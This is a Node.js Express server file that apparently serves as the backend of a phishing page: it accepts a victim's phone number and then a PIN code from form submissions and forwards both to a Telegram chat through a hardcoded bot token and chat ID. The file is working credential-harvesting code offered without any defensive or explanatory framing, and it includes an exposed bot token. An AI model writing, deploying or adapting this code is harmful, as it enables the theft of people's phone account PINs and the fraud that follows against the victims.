import express from 'express';
import bodyParser from 'body-parser';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const TELEGRAM_BOT_TOKEN = '7246291582:AAGDVmXvRKX_PdEug_XZ2-pKnXrkPMcS3k0';
const TELEGRAM_CHAT_ID = '-4544953608';
const PORT = process.env.PORT || 8000;  // Vercel will use a dynamic port

const clientData = {};

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public'))); // Ensure public folder is used for static content

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

app.post('/', async (req, res) => {
  const { phoneNumber, pinCode } = req.body;

  try {
    if (phoneNumber && !pinCode) {
      if (clientData[phoneNumber]) {
        return res.status(400).json({ error: "Phone number already submitted." });
      }
      clientData[phoneNumber] = { pin: null, state: 'waiting' };
      console.log(`Received phone number: ${phoneNumber}`);
      await sendTelegramMessage(`New Phone Number Submission:\nPhone Number: ${phoneNumber}`);
      return res.status(200).json({ status: "Phone number received. Waiting for PIN." });
    }

    if (pinCode && !phoneNumber) {
      const waitingPhoneNumber = Object.keys(clientData).find(
        (key) => clientData[key].state === 'waiting' && clientData[key].pin === null
      );

      if (!waitingPhoneNumber) {
        return res.status(400).json({ error: "No phone number waiting for a PIN." });
      }

      clientData[waitingPhoneNumber] = { pin: pinCode, state: 'completed' };
      console.log(`Received PIN: ${pinCode} for phone number: ${waitingPhoneNumber}`);
      await sendTelegramMessage(`New Client Submission:\nPhone Number: ${waitingPhoneNumber}\nPIN Code: ${pinCode}`);
      return res.status(200).json({ status: "PIN code received and sent to Telegram." });
    }

    res.status(400).json({ error: "Invalid data. Expected either phoneNumber or pinCode." });
  } catch (error) {
    console.error("Error handling POST request:", error);
    res.status(500).json({ error: "Internal server error." });
  }
});

async function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text: message };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorMessage = await response.text();
      console.error("Telegram API error:", errorMessage);
    }
  } catch (err) {
    console.error("Failed to send message to Telegram:", err);
  }
}

// Vercel automatically handles serverless functions, so this won't work directly on Vercel.
// You'd need to deploy this as a serverless function or use Vercel's built-in API routes.

export default app;
